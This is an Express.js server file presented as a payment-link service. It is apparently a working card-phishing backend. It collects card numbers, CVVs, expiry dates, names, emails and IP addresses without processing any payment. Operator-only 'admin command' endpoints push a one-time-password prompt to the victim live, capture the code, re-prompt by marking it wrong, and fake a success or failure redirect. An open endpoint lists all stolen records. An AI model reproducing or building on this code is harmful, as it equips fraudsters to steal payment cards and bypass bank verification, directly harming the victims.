// server.js
import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import http from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
app.use(bodyParser.json());
app.use(cors());
// Serve static files from the "public" folder
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.static(path.join(__dirname, 'public')));

const server = http.createServer(app);
const io = new Server(server);

const transactions = new Map();
const paymentLinks = new Map();

// Generate payment link endpoint (links to landing.html)
app.post('/api/generatePaymentLink', (req, res) => {
  const { amount, description } = req.body;
  if (!amount || !description) {
    return res.status(400).json({ status: "error", message: "Missing amount or description" });
  }
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  // Link directs to landing.html with pid query parameter
  const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
  paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
  console.log("Payment link generated:", paymentLink);
  res.json({ status: "success", paymentLink });
});

// Fetch payment details using pid (for landing & payment pages)
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// Get transaction details (for success/fail pages)
app.get('/api/getTransactionDetails', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  res.json(txn);
});

// Get all transactions (for admin panel)
app.get('/api/transactions', (req, res) => {
  const txList = Array.from(transactions.values());
  res.json(txList);
});

// Process payment details
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  if (!cardNumber || !expiry || !cvv || !email || !amount || !currency || !cardholder) {
    return res.status(400).json({ status: "error", message: "Missing payment details" });
  }
  // Capture IP address from request
  const ip = req.ip || req.headers['x-forwarded-for'] || 'unknown';
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ''),
    currency,
    cardholder,
    ip, // Save IP address
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    timestamp: new Date().toLocaleString()
  };
  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  res.json({ status: "success", invoiceId });
});

// Show OTP for a transaction (admin command)
app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  console.log(`Show OTP command issued for invoice ${invoiceId}`);
  io.to(invoiceId).emit('show_otp', { message: 'OTP form should be shown now' });
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

// Mark OTP as wrong (admin command)
app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpError = true;
  txn.status = 'otp_pending';
  console.log(`OTP marked as wrong for invoice ${invoiceId}`);
  res.json({ status: "success", message: "OTP marked as wrong" });
});

// Check transaction status (polled by payment page)
app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction details not found" });
  }
  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
  }
  if (txn.redirectStatus) {
    const redirectUrl = txn.redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`;
    return res.json({ status: "redirect", redirectUrl });
  }
  res.json({ status: txn.status, otpError: txn.otpError });
});

// Submit OTP
app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
  res.json({ status: "success", message: "OTP received" });
});

// Update redirect status (admin command: success/fail)
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) {
    return res.status(404).json({ status: "error", message: "Transaction not found" });
  }
  txn.redirectStatus = redirectStatus;
  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
  const redirectUrl = redirectStatus === 'success'
    ? `/success.html?invoiceId=${invoiceId}`
    : `/fail.html?invoiceId=${invoiceId}`;
  io.to(invoiceId).emit('redirect', { redirectStatus, redirectUrl });
  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl
  });
});

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id);
  socket.on('join', (invoiceId) => {
    socket.join(invoiceId);
    console.log(`Socket ${socket.id} joined room ${invoiceId}`);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
